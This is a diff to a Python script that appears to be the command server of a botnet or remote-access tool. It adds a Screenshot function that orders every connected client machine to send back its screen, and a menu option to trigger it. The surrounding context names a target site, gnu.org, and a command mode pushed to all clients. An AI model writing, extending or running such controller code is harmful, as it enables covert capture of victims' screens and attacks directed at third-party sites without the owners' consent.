@@ -68,6 +68,29 @@ def connect():
             connected[p][3] = data.decode() == "yes"
             Line(hn+" connection status: "+str(connected[p][3]),True)
 
+# Screenshot
+def Screenshot():
+    images = []
+    for cl,_,_,_ in connected:
+        cl.send(str("3").encode())
+    for cl,_,hn,_ in connected:
+        images.append(b'')
+        while True:
+            data = cl.recv(1024)
+            if not data:
+                break
+
+            try:
+                data = data.decode()
+            except Exception as e:
+                images[len(images)-1] += data
+                continue
+
+            if data == "end":
+                break
+
+    print(images)
+
 targetsite = "gnu.org"
 
 #COMMAND LIST 
@@ -98,8 +121,11 @@ try:
             if text == "end":
                 break
 
-            elif text == "1":
+            elif text == "1": # Connect
                 connect() 
+            elif text == "3": # Screenshot
+                Screenshot()
+
             elif text == "test":
                 SendToClients("cmdmode")
                 SendToClients(mktest)
